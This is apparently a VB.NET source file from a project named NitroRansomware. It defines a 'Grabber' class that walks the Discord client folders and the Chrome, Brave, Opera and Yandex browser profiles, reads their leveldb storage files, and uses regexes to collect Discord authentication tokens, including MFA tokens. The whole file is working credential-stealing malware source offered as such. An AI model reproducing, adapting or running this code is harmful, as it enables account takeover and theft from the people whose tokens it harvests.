Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Text.RegularExpressions
Namespace NitroRansomware
	Friend Class Grabber
		Private Shared target As New List(Of String)()
		Private Shared Sub Scan()
			Dim roaming As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
			Dim local As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
			target.Add(roaming & "\Discord")
			target.Add(roaming & "\discordcanary")
			target.Add(roaming & "\discordptb")
			target.Add(roaming & "\\Opera Software\Opera Stable")
			target.Add(local & "\Google\Chrome\User Data\Default")
			target.Add(local & "\BraveSoftware\Brave-Browser\User Data\Default")
			target.Add(local & "\Yandex\YandexBrowser\User Data\Default")
		End Sub
		Public Shared Function Grab() As List(Of String)
			Scan()
			Dim tokens As New List(Of String)()
			For Each x As String In target
				If Directory.Exists(x) Then
					Dim path As String = x & "\Local Storage\leveldb"
					Dim leveldb As New DirectoryInfo(path)
					For Each file In leveldb.GetFiles(If(False, "*.log", "*.ldb"))
						Dim contents As String = file.OpenText().ReadToEnd()
						For Each match As Match In Regex.Matches(contents, "[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
							tokens.Add(match.Value)
						Next match

						For Each match As Match In Regex.Matches(contents, "mfa\.[\w-]{84}")
							tokens.Add(match.Value)
						Next match
					Next file
				End If
			Next x
			Return tokens
		End Function
	End Class

End Namespace
